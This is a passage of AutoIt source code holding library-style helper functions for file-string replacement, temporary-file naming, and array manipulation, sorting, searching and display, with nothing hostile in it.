			$szpath = StringTrimLeft($szpath, $pos - 1)
		EndIf
	EndIf
	Local $nposforward = StringInStr($szpath, "/", 0, -1)
	Local $nposbackward = StringInStr($szpath, "\", 0, -1)
	If $nposforward >= $nposbackward Then
		$pos = $nposforward
	Else
		$pos = $nposbackward
	EndIf
	$dir = StringLeft($szpath, $pos)
	$fname = StringRight($szpath, StringLen($szpath) - $pos)
	If StringLen($dir) = 0 Then $fname = $szpath
	$pos = StringInStr($fname, ".", 0, -1)
	If $pos Then
		$ext = StringRight($fname, StringLen($fname) - ($pos - 1))
		$fname = StringLeft($fname, $pos - 1)
	EndIf
	$szdrive = $drive
	$szdir = $dir
	$szfname = $fname
	$szext = $ext
	$array[1] = $drive
	$array[2] = $dir
	$array[3] = $fname
	$array[4] = $ext
	Return $array
EndFunc

Func _replacestringinfile($szfilename, $szsearchstring, $szreplacestring, $fcaseness = 0, $foccurance = 1)
	Local $iretval = 0
	Local $ncount, $sendswith
	If StringInStr(FileGetAttrib($szfilename), "R") Then Return SetError(6, 0, -1)
	Local $hfile = FileOpen($szfilename, $fo_read)
	If $hfile = -1 Then Return SetError(1, 0, -1)
	Local $s_totfile = FileRead($hfile, FileGetSize($szfilename))
	If StringRight($s_totfile, 2) = @CRLF Then
		$sendswith = @CRLF
	ElseIf StringRight($s_totfile, 1) = @CR Then
		$sendswith = @CR
	ElseIf StringRight($s_totfile, 1) = @LF Then
		$sendswith = @LF
	Else
		$sendswith = ""
	EndIf
	Local $afilelines = StringSplit(StringStripCR($s_totfile), @LF)
	FileClose($hfile)
	Local $iencoding = FileGetEncoding($szfilename)
	Local $hwritehandle = FileOpen($szfilename, $iencoding + $fo_overwrite)
	If $hwritehandle = -1 Then Return SetError(2, 0, -1)
	For $ncount = 1 To $afilelines[0]
		If StringInStr($afilelines[$ncount], $szsearchstring, $fcaseness) Then
			$afilelines[$ncount] = StringReplace($afilelines[$ncount], $szsearchstring, $szreplacestring, 1 - $foccurance, $fcaseness)
			$iretval = $iretval + 1
			If $foccurance = 0 Then
				$iretval = 1
				ExitLoop
			EndIf
		EndIf
	Next
	For $ncount = 1 To $afilelines[0] - 1
		If FileWriteLine($hwritehandle, $afilelines[$ncount]) = 0 Then
			FileClose($hwritehandle)
			Return SetError(3, 0, -1)
		EndIf
	Next
	If $afilelines[$ncount] <> "" Then FileWrite($hwritehandle, $afilelines[$ncount] & $sendswith)
	FileClose($hwritehandle)
	Return $iretval
EndFunc

Func _tempfile($s_directoryname = @TempDir, $s_fileprefix = "~", $s_fileextension = ".tmp", $i_randomlength = 7)
	If IsKeyword($s_fileprefix) Then $s_fileprefix = "~"
	If IsKeyword($s_fileextension) Then $s_fileextension = ".tmp"
	If IsKeyword($i_randomlength) Then $i_randomlength = 7
	If NOT FileExists($s_directoryname) Then $s_directoryname = @TempDir
	If NOT FileExists($s_directoryname) Then $s_directoryname = @ScriptDir
	If StringRight($s_directoryname, 1) <> "\" Then $s_directoryname = $s_directoryname & "\"
	Local $s_tempname
	Do
		$s_tempname = ""
		While StringLen($s_tempname) < $i_randomlength
			$s_tempname = $s_tempname & Chr(Random(97, 122, 1))
		WEnd
		$s_tempname = $s_directoryname & $s_fileprefix & $s_tempname & $s_fileextension
	Until NOT FileExists($s_tempname)
	Return $s_tempname
EndFunc

Func _arrayadd(ByRef $avarray, $vvalue)
	If NOT IsArray($avarray) Then Return SetError(1, 0, -1)
	If UBound($avarray, 0) <> 1 Then Return SetError(2, 0, -1)
	Local $iubound = UBound($avarray)
	ReDim $avarray[$iubound + 1]
	$avarray[$iubound] = $vvalue
	Return $iubound
EndFunc

Func _arraybinarysearch(Const ByRef $avarray, $vvalue, $istart = 0, $iend = 0)
	If NOT IsArray($avarray) Then Return SetError(1, 0, -1)
	If UBound($avarray, 0) <> 1 Then Return SetError(5, 0, -1)
	Local $iubound = UBound($avarray) - 1
	If $iend < 1 OR $iend > $iubound Then $iend = $iubound
	If $istart < 0 Then $istart = 0
	If $istart > $iend Then Return SetError(4, 0, -1)
	Local $imid = Int(($iend + $istart) / 2)
	If $avarray[$istart] > $vvalue OR $avarray[$iend] < $vvalue Then Return SetError(2, 0, -1)
	While $istart <= $imid AND $vvalue <> $avarray[$imid]
		If $vvalue < $avarray[$imid] Then
			$iend = $imid - 1
		Else
			$istart = $imid + 1
		EndIf
		$imid = Int(($iend + $istart) / 2)
	WEnd
	If $istart > $iend Then Return SetError(3, 0, -1)
	Return $imid
EndFunc

Func _arraycombinations(ByRef $avarray, $iset, $sdelim = "")
	If NOT IsArray($avarray) Then Return SetError(1, 0, 0)
	If UBound($avarray, 0) <> 1 Then Return SetError(2, 0, 0)
	Local $in = UBound($avarray)
	Local $ir = $iset
	Local $aidx[$ir]
	For $i = 0 To $ir - 1
		$aidx[$i] = $i
	Next
	Local $itotal = __array_combinations($in, $ir)
	Local $ileft = $itotal
	Local $aresult[$itotal + 1]
	$aresult[0] = $itotal
	Local $icount = 1
	While $ileft > 0
		__array_getnext($in, $ir, $ileft, $itotal, $aidx)
		For $i = 0 To $iset - 1
			$aresult[$icount] &= $avarray[$aidx[$i]] & $sdelim
		Next
		If $sdelim <> "" Then $aresult[$icount] = StringTrimRight($aresult[$icount], 1)
		$icount += 1
	WEnd
	Return $aresult
EndFunc

Func _arrayconcatenate(ByRef $avarraytarget, Const ByRef $avarraysource, $istart = 0)
	If NOT IsArray($avarraytarget) Then Return SetError(1, 0, 0)
	If NOT IsArray($avarraysource) Then Return SetError(2, 0, 0)
	If UBound($avarraytarget, 0) <> 1 Then
		If UBound($avarraysource, 0) <> 1 Then Return SetError(5, 0, 0)
		Return SetError(3, 0, 0)
	EndIf
	If UBound($avarraysource, 0) <> 1 Then Return SetError(4, 0, 0)
	Local $iuboundtarget = UBound($avarraytarget) - $istart, $iuboundsource = UBound($avarraysource)
	ReDim $avarraytarget[$iuboundtarget + $iuboundsource]
	For $i = $istart To $iuboundsource - 1
		$avarraytarget[$iuboundtarget + $i] = $avarraysource[$i]
	Next
	Return $iuboundtarget + $iuboundsource
EndFunc

Func _arraycreate($v_0, $v_1 = 0, $v_2 = 0, $v_3 = 0, $v_4 = 0, $v_5 = 0, $v_6 = 0, $v_7 = 0, $v_8 = 0, $v_9 = 0, $v_10 = 0, $v_11 = 0, $v_12 = 0, $v_13 = 0, $v_14 = 0, $v_15 = 0, $v_16 = 0, $v_17 = 0, $v_18 = 0, $v_19 = 0, $v_20 = 0)
	Local $av_array[21] = [$v_0, $v_1, $v_2, $v_3, $v_4, $v_5, $v_6, $v_7, $v_8, $v_9, $v_10, $v_11, $v_12, $v_13, $v_14, $v_15, $v_16, $v_17, $v_18, $v_19, $v_20]
	ReDim $av_array[@NumParams]
	Return $av_array
EndFunc

Func _arraydelete(ByRef $avarray, $ielement)
	If NOT IsArray($avarray) Then Return SetError(1, 0, 0)
	Local $iubound = UBound($avarray, 1) - 1
	If NOT $iubound Then
		$avarray = ""
		Return 0
	EndIf
	If $ielement < 0 Then $ielement = 0
	If $ielement > $iubound Then $ielement = $iubound
	Switch UBound($avarray, 0)
		Case 1
			For $i = $ielement To $iubound - 1
				$avarray[$i] = $avarray[$i + 1]
			Next
			ReDim $avarray[$iubound]
		Case 2
			Local $isubmax = UBound($avarray, 2) - 1
			For $i = $ielement To $iubound - 1
				For $j = 0 To $isubmax
					$avarray[$i][$j] = $avarray[$i + 1][$j]
				Next
			Next
			ReDim $avarray[$iubound][$isubmax + 1]
		Case Else
			Return SetError(3, 0, 0)
	EndSwitch
	Return $iubound
EndFunc

Func _arraydisplay(Const ByRef $avarray, $stitle = "Array: ListView Display", $iitemlimit = -1, $itranspose = 0, $sseparator = "", $sreplace = "|", $sheader = "")
	If NOT IsArray($avarray) Then Return SetError(1, 0, 0)
	Local $idimension = UBound($avarray, 0), $iubound = UBound($avarray, 1) - 1, $isubmax = UBound($avarray, 2) - 1
	If $idimension > 2 Then Return SetError(2, 0, 0)
	If $sseparator = "" Then $sseparator = Chr(124)
	If _arraysearch($avarray, $sseparator, 0, 0, 0, 1) <> -1 Then
		For $x = 1 To 255
			If $x >= 32 AND $x <= 127 Then ContinueLoop
			Local $sfind = _arraysearch($avarray, Chr($x), 0, 0, 0, 1)
			If $sfind = -1 Then
				$sseparator = Chr($x)
				ExitLoop
			EndIf
		Next
	EndIf
	Local $vtmp, $ibuffer = 4094
	Local $icollimit = 250
	Local $ioneventmode = Opt("GUIOnEventMode", 0), $sdataseparatorchar = Opt("GUIDataSeparatorChar", $sseparator)
	If $isubmax < 0 Then $isubmax = 0
	If $itranspose Then
		$vtmp = $iubound
		$iubound = $isubmax
		$isubmax = $vtmp
	EndIf
	If $isubmax > $icollimit Then $isubmax = $icollimit
	If $iitemlimit < 1 Then $iitemlimit = $iubound
	If $iubound > $iitemlimit Then $iubound = $iitemlimit
	If $sheader = "" Then
		$sheader = "Row  "
		For $i = 0 To $isubmax
			$sheader &= $sseparator & "Col " & $i
		Next
	EndIf
	Local $avarraytext[$iubound + 1]
	For $i = 0 To $iubound
		$avarraytext[$i] = "[" & $i & "]"
		For $j = 0 To $isubmax
			If $idimension = 1 Then
				If $itranspose Then
					$vtmp = $avarray[$j]
				Else
					$vtmp = $avarray[$i]
				EndIf
			Else
				If $itranspose Then
					$vtmp = $avarray[$j][$i]
				Else
					$vtmp = $avarray[$i][$j]
				EndIf
			EndIf
			$vtmp = StringReplace($vtmp, $sseparator, $sreplace, 0, 1)
			If StringLen($vtmp) > $ibuffer Then $vtmp = StringLeft($vtmp, $ibuffer)
			$avarraytext[$i] &= $sseparator & $vtmp
		Next
	Next
	Local Const $_arrayconstant_gui_dockborders = 102
	Local Const $_arrayconstant_gui_dockbottom = 64
	Local Const $_arrayconstant_gui_dockheight = 512
	Local Const $_arrayconstant_gui_dockleft = 2
	Local Const $_arrayconstant_gui_dockright = 4
	Local Const $_arrayconstant_gui_event_close = -3
	Local Const $_arrayconstant_lvm_getcolumnwidth = (4096 + 29)
	Local Const $_arrayconstant_lvm_getitemcount = (4096 + 4)
	Local Const $_arrayconstant_lvm_getitemstate = (4096 + 44)
	Local Const $_arrayconstant_lvm_setextendedlistviewstyle = (4096 + 54)
	Local Const $_arrayconstant_lvs_ex_fullrowselect = 32
	Local Const $_arrayconstant_lvs_ex_gridlines = 1
	Local Const $_arrayconstant_lvs_showselalways = 8
	Local Const $_arrayconstant_ws_ex_clientedge = 512
	Local Const $_arrayconstant_ws_maximizebox = 65536
	Local Const $_arrayconstant_ws_minimizebox = 131072
	Local Const $_arrayconstant_ws_sizebox = 262144
	Local $iwidth = 640, $iheight = 480
	Local $hgui = GUICreate($stitle, $iwidth, $iheight, Default, Default, BitOR($_arrayconstant_ws_sizebox, $_arrayconstant_ws_minimizebox, $_arrayconstant_ws_maximizebox))
	Local $aiguisize = WinGetClientSize($hgui)
	Local $hlistview = GUICtrlCreateListView($sheader, 0, 0, $aiguisize[0], $aiguisize[1] - 26, $_arrayconstant_lvs_showselalways)
	Local $hcopy = GUICtrlCreateButton("Copy Selected", 3, $aiguisize[1] - 23, $aiguisize[0] - 6, 20)
	GUICtrlSetResizing($hlistview, $_arrayconstant_gui_dockborders)
	GUICtrlSetResizing($hcopy, $_arrayconstant_gui_dockleft + $_arrayconstant_gui_dockright + $_arrayconstant_gui_dockbottom + $_arrayconstant_gui_dockheight)
	GUICtrlSendMsg($hlistview, $_arrayconstant_lvm_setextendedlistviewstyle, $_arrayconstant_lvs_ex_gridlines, $_arrayconstant_lvs_ex_gridlines)
	GUICtrlSendMsg($hlistview, $_arrayconstant_lvm_setextendedlistviewstyle, $_arrayconstant_lvs_ex_fullrowselect, $_arrayconstant_lvs_ex_fullrowselect)
	GUICtrlSendMsg($hlistview, $_arrayconstant_lvm_setextendedlistviewstyle, $_arrayconstant_ws_ex_clientedge, $_arrayconstant_ws_ex_clientedge)
	For $i = 0 To $iubound
		GUICtrlCreateListViewItem($avarraytext[$i], $hlistview)
	Next
	$iwidth = 0
	For $i = 0 To $isubmax + 1
		$iwidth += GUICtrlSendMsg($hlistview, $_arrayconstant_lvm_getcolumnwidth, $i, 0)
	Next
	If $iwidth < 250 Then $iwidth = 230
	$iwidth += 20
	If $iwidth > @DesktopWidth Then $iwidth = @DesktopWidth - 100
	WinMove($hgui, "", (@DesktopWidth - $iwidth) / 2, Default, $iwidth)
	GUISetState(@SW_SHOW, $hgui)
	While 1
		Switch GUIGetMsg()
			Case $_arrayconstant_gui_event_close
				ExitLoop
			Case $hcopy
				Local $sclip = ""
				Local $aicuritems[1] = [0]
				For $i = 0 To GUICtrlSendMsg($hlistview, $_arrayconstant_lvm_getitemcount, 0, 0)
					If GUICtrlSendMsg($hlistview, $_arrayconstant_lvm_getitemstate, $i, 2) Then
						$aicuritems[0] += 1
						ReDim $aicuritems[$aicuritems[0] + 1]
						$aicuritems[$aicuritems[0]] = $i
					EndIf
				Next
				If NOT $aicuritems[0] Then
					For $sitem In $avarraytext
						$sclip &= $sitem & @CRLF
					Next
				Else
					For $i = 1 To UBound($aicuritems) - 1
						$sclip &= $avarraytext[$aicuritems[$i]] & @CRLF
					Next
				EndIf
				ClipPut($sclip)
		EndSwitch
	WEnd
	GUIDelete($hgui)
	Opt("GUIOnEventMode", $ioneventmode)
	Opt("GUIDataSeparatorChar", $sdataseparatorchar)
	Return 1
EndFunc

Func _arrayfindall(Const ByRef $avarray, $vvalue, $istart = 0, $iend = 0, $icase = 0, $icompare = 0, $isubitem = 0)
	$istart = _arraysearch($avarray, $vvalue, $istart, $iend, $icase, $icompare, 1, $isubitem)
	If @error Then Return SetError(@error, 0, -1)
	Local $iindex = 0, $avresult[UBound($avarray)]
	Do
		$avresult[$iindex] = $istart
		$iindex += 1
		$istart = _arraysearch($avarray, $vvalue, $istart + 1, $iend, $icase, $icompare, 1, $isubitem)
	Until @error
	ReDim $avresult[$iindex]
	Return $avresult
EndFunc

Func _arrayinsert(ByRef $avarray, $ielement, $vvalue = "")
	If NOT IsArray($avarray) Then Return SetError(1, 0, 0)
	If UBound($avarray, 0) <> 1 Then Return SetError(2, 0, 0)
	Local $iubound = UBound($avarray) + 1
	ReDim $avarray[$iubound]
	For $i = $iubound - 1 To $ielement + 1 Step -1
		$avarray[$i] = $avarray[$i - 1]
	Next
	$avarray[$ielement] = $vvalue
	Return $iubound
EndFunc

Func _arraymax(Const ByRef $avarray, $icompnumeric = 0, $istart = 0, $iend = 0)
	Local $iresult = _arraymaxindex($avarray, $icompnumeric, $istart, $iend)
	If @error Then Return SetError(@error, 0, "")
	Return $avarray[$iresult]
EndFunc

Func _arraymaxindex(Const ByRef $avarray, $icompnumeric = 0, $istart = 0, $iend = 0)
	If NOT IsArray($avarray) OR UBound($avarray, 0) <> 1 Then Return SetError(1, 0, -1)
	If UBound($avarray, 0) <> 1 Then Return SetError(3, 0, -1)
	Local $iubound = UBound($avarray) - 1
	If $iend < 1 OR $iend > $iubound Then $iend = $iubound
	If $istart < 0 Then $istart = 0
	If $istart > $iend Then Return SetError(2, 0, -1)
	Local $imaxindex = $istart
	If $icompnumeric Then
		For $i = $istart To $iend
			If Number($avarray[$imaxindex]) < Number($avarray[$i]) Then $imaxindex = $i
		Next
	Else
		For $i = $istart To $iend
			If $avarray[$imaxindex] < $avarray[$i] Then $imaxindex = $i
		Next
	EndIf
	Return $imaxindex
EndFunc

Func _arraymin(Const ByRef $avarray, $icompnumeric = 0, $istart = 0, $iend = 0)
	Local $iresult = _arrayminindex($avarray, $icompnumeric, $istart, $iend)
	If @error Then Return SetError(@error, 0, "")
	Return $avarray[$iresult]
EndFunc

Func _arrayminindex(Const ByRef $avarray, $icompnumeric = 0, $istart = 0, $iend = 0)
	If NOT IsArray($avarray) Then Return SetError(1, 0, -1)
	If UBound($avarray, 0) <> 1 Then Return SetError(3, 0, -1)
	Local $iubound = UBound($avarray) - 1
	If $iend < 1 OR $iend > $iubound Then $iend = $iubound
	If $istart < 0 Then $istart = 0
	If $istart > $iend Then Return SetError(2, 0, -1)
	Local $iminindex = $istart
	If $icompnumeric Then
		For $i = $istart To $iend
			If Number($avarray[$iminindex]) > Number($avarray[$i]) Then $iminindex = $i
		Next
	Else
		For $i = $istart To $iend
			If $avarray[$iminindex] > $avarray[$i] Then $iminindex = $i
		Next
	EndIf
	Return $iminindex
EndFunc

Func _arraypermute(ByRef $avarray, $sdelim = "")
	If NOT IsArray($avarray) Then Return SetError(1, 0, 0)
	If UBound($avarray, 0) <> 1 Then Return SetError(2, 0, 0)
	Local $isize = UBound($avarray), $ifactorial = 1, $aidx[$isize], $aresult[1], $icount = 1
	For $i = 0 To $isize - 1
		$aidx[$i] = $i
	Next
	For $i = $isize To 1 Step -1
		$ifactorial *= $i
	Next
	ReDim $aresult[$ifactorial + 1]
	$aresult[0] = $ifactorial
	__array_exeterinternal($avarray, 0, $isize, $sdelim, $aidx, $aresult, $icount)
	Return $aresult
EndFunc

Func _arraypop(ByRef $avarray)
	If (NOT IsArray($avarray)) Then Return SetError(1, 0, "")
	If UBound($avarray, 0) <> 1 Then Return SetError(2, 0, "")
	Local $iubound = UBound($avarray) - 1, $slastval = $avarray[$iubound]
	If NOT $iubound Then
		$avarray = ""
	Else
		ReDim $avarray[$iubound]
	EndIf
	Return $slastval
EndFunc

Func _arraypush(ByRef $avarray, $vvalue, $idirection = 0)
	If (NOT IsArray($avarray)) Then Return SetError(1, 0, 0)
	If UBound($avarray, 0) <> 1 Then Return SetError(3, 0, 0)
	Local $iubound = UBound($avarray) - 1
	If IsArray($vvalue) Then
		Local $iubounds = UBound($vvalue)
		If ($iubounds - 1) > $iubound Then Return SetError(2, 0, 0)
		If $idirection Then
			For $i = $iubound To $iubounds Step -1
				$avarray[$i] = $avarray[$i - $iubounds]
			Next
			For $i = 0 To $iubounds - 1
				$avarray[$i] = $vvalue[$i]
			Next
		Else
			For $i = 0 To $iubound - $iubounds
				$avarray[$i] = $avarray[$i + $iubounds]
			Next
			For $i = 0 To $iubounds - 1
				$avarray[$i + $iubound - $iubounds + 1] = $vvalue[$i]
			Next
		EndIf
	Else
		If $idirection Then
			For $i = $iubound To 1 Step -1
				$avarray[$i] = $avarray[$i - 1]
			Next
			$avarray[0] = $vvalue
		Else
			For $i = 0 To $iubound - 1
				$avarray[$i] = $avarray[$i + 1]
			Next
			$avarray[$iubound] = $vvalue
		EndIf
	EndIf
	Return 1
EndFunc

Func _arrayreverse(ByRef $avarray, $istart = 0, $iend = 0)
	If NOT IsArray($avarray) Then Return SetError(1, 0, 0)
	If UBound($avarray, 0) <> 1 Then Return SetError(3, 0, 0)
	Local $vtmp, $iubound = UBound($avarray) - 1
	If $iend < 1 OR $iend > $iubound Then $iend = $iubound
	If $istart < 0 Then $istart = 0
	If $istart > $iend Then Return SetError(2, 0, 0)
	For $i = $istart To Int(($istart + $iend - 1) / 2)
		$vtmp = $avarray[$i]
		$avarray[$i] = $avarray[$iend]
		$avarray[$iend] = $vtmp
		$iend -= 1
	Next
	Return 1
EndFunc

Func _arraysearch(Const ByRef $avarray, $vvalue, $istart = 0, $iend = 0, $icase = 0, $icompare = 0, $iforward = 1, $isubitem = -1)
	If NOT IsArray($avarray) Then Return SetError(1, 0, -1)
	If UBound($avarray, 0) > 2 OR UBound($avarray, 0) < 1 Then Return SetError(2, 0, -1)
	Local $iubound = UBound($avarray) - 1
	If $iend < 1 OR $iend > $iubound Then $iend = $iubound
	If $istart < 0 Then $istart = 0
	If $istart > $iend Then Return SetError(4, 0, -1)
	Local $istep = 1
	If NOT $iforward Then
		Local $itmp = $istart
		$istart = $iend
		$iend = $itmp
		$istep = -1
	EndIf
	Local $icomptype = False
	If $icompare = 2 Then
		$icompare = 0
		$icomptype = True
	EndIf
	Switch UBound($avarray, 0)
		Case 1
			If NOT $icompare Then
				If NOT $icase Then
					For $i = $istart To $iend Step $istep
						If $icomptype AND VarGetType($avarray[$i]) <> VarGetType($vvalue) Then ContinueLoop
						If $avarray[$i] = $vvalue Then Return $i
					Next
				Else
					For $i = $istart To $iend Step $istep
						If $icomptype AND VarGetType($avarray[$i]) <> VarGetType($vvalue) Then ContinueLoop
						If $avarray[$i] == $vvalue Then Return $i
					Next
				EndIf
			Else
				For $i = $istart To $iend Step $istep
					If StringInStr($avarray[$i], $vvalue, $icase) > 0 Then Return $i
				Next
			EndIf
		Case 2
			Local $iuboundsub = UBound($avarray, 2) - 1
			If $isubitem > $iuboundsub Then $isubitem = $iuboundsub
			If $isubitem < 0 Then
				$isubitem = 0
			Else
				$iuboundsub = $isubitem
			EndIf
			For $j = $isubitem To $iuboundsub
				If NOT $icompare Then
					If NOT $icase Then
						For $i = $istart To $iend Step $istep
							If $icomptype AND VarGetType($avarray[$i][$j]) <> VarGetType($vvalue) Then ContinueLoop
							If $avarray[$i][$j] = $vvalue Then Return $i
						Next
					Else
						For $i = $istart To $iend Step $istep
							If $icomptype AND VarGetType($avarray[$i][$j]) <> VarGetType($vvalue) Then ContinueLoop
							If $avarray[$i][$j] == $vvalue Then Return $i
						Next
					EndIf
				Else
					For $i = $istart To $iend Step $istep
						If StringInStr($avarray[$i][$j], $vvalue, $icase) > 0 Then Return $i
					Next
				EndIf
			Next
		Case Else
			Return SetError(7, 0, -1)
	EndSwitch
	Return SetError(6, 0, -1)
EndFunc

Func _arraysort(ByRef $avarray, $idescending = 0, $istart = 0, $iend = 0, $isubitem = 0)
	If NOT IsArray($avarray) Then Return SetError(1, 0, 0)
	Local $iubound = UBound($avarray) - 1
	If $iend < 1 OR $iend > $iubound Then $iend = $iubound
	If $istart < 0 Then $istart = 0
	If $istart > $iend Then Return SetError(2, 0, 0)
	Switch UBound($avarray, 0)
		Case 1
			__arrayquicksort1d($avarray, $istart, $iend)
			If $idescending Then _arrayreverse($avarray, $istart, $iend)
		Case 2
			Local $isubmax = UBound($avarray, 2) - 1
			If $isubitem > $isubmax Then Return SetError(3, 0, 0)
			If $idescending Then
				$idescending = -1
			Else
				$idescending = 1
			EndIf
			__arrayquicksort2d($avarray, $idescending, $istart, $iend, $isubitem, $isubmax)
		Case Else
			Return SetError(4, 0, 0)
	EndSwitch
	Return 1
EndFunc

Func __arrayquicksort1d(ByRef $avarray, ByRef $istart, ByRef $iend)
	If $iend <= $istart Then Return 
	Local $vtmp
	If ($iend - $istart) < 15 Then
		Local $vcur
		For $i = $istart + 1 To $iend
			$vtmp = $avarray[$i]
			If IsNumber($vtmp) Then
				For $j = $i - 1 To $istart Step -1
					$vcur = $avarray[$j]
					If ($vtmp >= $vcur AND IsNumber($vcur)) OR (NOT IsNumber($vcur) AND StringCompare($vtmp, $vcur) >= 0) Then ExitLoop
					$avarray[$j + 1] = $vcur
				Next
			Else
				For $j = $i - 1 To $istart Step -1
					If (StringCompare($vtmp, $avarray[$j]) >= 0) Then ExitLoop
					$avarray[$j + 1] = $avarray[$j]
				Next
			EndIf
			$avarray[$j + 1] = $vtmp
		Next
		Return 
	EndIf
	Local $l = $istart, $r = $iend, $vpivot = $avarray[Int(($istart + $iend) / 2)], $fnum = IsNumber($vpivot)
	Do
		If $fnum Then
			While ($avarray[$l] < $vpivot AND IsNumber($avarray[$l])) OR (NOT IsNumber($avarray[$l]) AND StringCompare($avarray[$l], $vpivot) < 0)
				$l += 1
			WEnd
			While ($avarray[$r] > $vpivot AND IsNumber($avarray[$r])) OR (NOT IsNumber($avarray[$r]) AND StringCompare($avarray[$r], $vpivot) > 0)
				$r -= 1
			WEnd
		Else
			While (StringCompare($avarray[$l], $vpivot) < 0)
				$l += 1
			WEnd
			While (StringCompare($avarray[$r], $vpivot) > 0)
				$r -= 1
			WEnd
		EndIf
		If $l <= $r Then
			$vtmp = $avarray[$l]
			$avarray[$l] = $avarray[$r]
			$avarray[$r] = $vtmp
			$l += 1
			$r -= 1
		EndIf
	Until $l > $r
	__arrayquicksort1d($avarray, $istart, $r)
	__arrayquicksort1d($avarray, $l, $iend)
EndFunc

Func __arrayquicksort2d(ByRef $avarray, ByRef $istep, ByRef $istart, ByRef $iend, ByRef $isubitem, ByRef $isubmax)
	If $iend <= $istart Then Return 
	Local $vtmp, $l = $istart, $r = $iend, $vpivot = $avarray[Int(($istart + $iend) / 2)][$isubitem], $fnum = IsNumber($vpivot)
	Do
		If $fnum Then
			While ($istep * ($avarray[$l][$isubitem] - $vpivot) < 0 AND IsNumber($avarray[$l][$isubitem])) OR (NOT IsNumber($avarray[$l][$isubitem]) AND $istep * StringCompare($avarray[$l][$isubitem], $vpivot) < 0)
				$l += 1
			WEnd
			While ($istep * ($avarray[$r][$isubitem] - $vpivot) > 0 AND IsNumber($avarray[$r][$isubitem])) OR (NOT IsNumber($avarray[$r][$isubitem]) AND $istep * StringCompare($avarray[$r][$isubitem], $vpivot) > 0)
				$r -= 1
			WEnd
		Else
			While ($istep * StringCompare($avarray[$l][$isubitem], $vpivot) < 0)
				$l += 1
			WEnd
			While ($istep * StringCompare($avarray[$r][$isubitem], $vpivot) > 0)
				$r -= 1
			WEnd
		EndIf
		If $l <= $r Then
			For $i = 0 To $isubmax
				$vtmp = $avarray[$l][$i]
				$avarray[$l][$i] = $avarray[$r][$i]
				$avarray[$r][$i] = $vtmp
			Next
			$l += 1
			$r -= 1
		EndIf
	Until $l > $r
	__arrayquicksort2d($avarray, $istep, $istart, $r, $isubitem, $isubmax)
	__arrayquicksort2d($avarray, $istep, $l, $iend, $isubitem, $isubmax)
EndFunc

Func _arrayswap(ByRef $vitem1, ByRef $vitem2)
	Local $vtmp = $vitem1
	$vitem1 = $vitem2
	$vitem2 = $vtmp
EndFunc

Func _arraytoclip(Const ByRef $avarray, $istart = 0, $iend = 0)
	Local $sresult = _arraytostring($avarray, @CR, $istart, $iend)
	If @error Then Return SetError(@error, 0, 0)
	Return ClipPut($sresult)
EndFunc

Func _arraytostring(Const ByRef $avarray, $sdelim = "|", $istart = 0, $iend = 0)
	If NOT IsArray($avarray) Then Return SetError(1, 0, "")
	If UBound($avarray, 0) <> 1 Then Return SetError(3, 0, "")
	Local $sresult, $iubound = UBound($avarray) - 1
	If $iend < 1 OR $iend > $iubound Then $iend = $iubound
	If $istart < 0 Then $istart = 0
	If $istart > $iend Then Return SetError(2, 0, "")
	For $i = $istart To $iend
		$sresult &= $avarray[$i] & $sdelim
	Next
	Return StringTrimRight($sresult, StringLen($sdelim))
EndFunc

Func _arraytrim(ByRef $avarray, $itrimnum, $idirection = 0, $istart = 0, $iend = 0)
	If NOT IsArray($avarray) Then Return SetError(1, 0, 0)
	If UBound($avarray, 0) <> 1 Then Return SetError(2, 0, 0)
	Local $iubound = UBound($avarray) - 1
	If $iend < 1 OR $iend > $iubound Then $iend = $iubound
	If $istart < 0 Then $istart = 0
	If $istart > $iend Then Return SetError(5, 0, 0)
	If $idirection Then
		For $i = $istart To $iend
			$avarray[$i] = StringTrimRight($avarray[$i], $itrimnum)
		Next
	Else
		For $i = $istart To $iend
			$avarray[$i] = StringTrimLeft($avarray[$i], $itrimnum)
		Next
	EndIf
	Return 1
EndFunc

Func _arrayunique($aarray, $idimension = 1, $ibase = 0, $icase = 0, $vdelim = "|")
	Local $iubounddim
	If $vdelim = "|" Then $vdelim = Chr(1)
	If NOT IsArray($aarray) Then Return SetError(1, 0, 0)
	If NOT $idimension > 0 Then
		Return SetError(3, 0, 0)
	Else
		$iubounddim = UBound($aarray, 1)
		If @error Then Return SetError(3, 0, 0)
		If $idimension > 1 Then
			Local $aarraytmp[1]
			For $i = 0 To $iubounddim - 1
				_arrayadd($aarraytmp, $aarray[$i][$idimension - 1])
			Next
			_arraydelete($aarraytmp, 0)
		Else
			If UBound($aarray, 0) = 1 Then
				Dim $aarraytmp[1]
				For $i = 0 To $iubounddim - 1
					_arrayadd($aarraytmp, $aarray[$i])
				Next
				_arraydelete($aarraytmp, 0)
			Else
				Dim $aarraytmp[1]
				For $i = 0 To $iubounddim - 1
					_arrayadd($aarraytmp, $aarray[$i][$idimension - 1])
				Next
				_arraydelete($aarraytmp, 0)
			EndIf
		EndIf
	EndIf
	Local $shold
	For $icc = $ibase To UBound($aarraytmp) - 1
		If NOT StringInStr($vdelim & $shold, $vdelim & $aarraytmp[$icc] & $vdelim, $icase) Then $shold &= $aarraytmp[$icc] & $vdelim
	Next
	If $shold Then
		$aarraytmp = StringSplit(StringTrimRight($shold, StringLen($vdelim)), $vdelim, 1)
		Return $aarraytmp
	EndIf
	Return SetError(2, 0, 0)
EndFunc

Func __array_exeterinternal(ByRef $avarray, $istart, $isize, $sdelim, ByRef $aidx, ByRef $aresult, ByRef $icount)
	If $istart == $isize - 1 Then
		For $i = 0 To $isize - 1
			$aresult[$icount] &= $avarray[$aidx[$i]] & $sdelim
		Next
		If $sdelim <> "" Then $aresult[$icount] = StringTrimRight($aresult[$icount], 1)
		$icount += 1
	Else
		Local $itemp
		For $i = $istart To $isize - 1
			$itemp = $aidx[$i]
			$aidx[$i] = $aidx[$istart]
			$aidx[$istart] = $itemp
			__array_exeterinternal($avarray, $istart + 1, $isize, $sdelim, $aidx, $aresult, $icount)
			$aidx[$istart] = $aidx[$i]
			$aidx[$i] = $itemp
		Next
	EndIf
EndFunc

Func __array_combinations($in, $ir)
	Local $i_total = 1
	For $i = $ir To 1 Step -1
		$i_total *= ($in / $i)
		$in -= 1
	Next
	Return Round($i_total)
EndFunc

Func __array_getnext($in, $ir, ByRef $ileft, $itotal, ByRef $aidx)
	If $ileft == $itotal Then
		$ileft -= 1
		Return 
	EndIf
	Local $i = $ir - 1
	While $aidx[$i] == $in - $ir + $i
		$i -= 1
	WEnd
	$aidx[$i] += 1
	For $j = $i + 1 To $ir - 1
		$aidx[$j] = $aidx[$i] + $j - $i
	Next
	$ileft -= 1
EndFunc

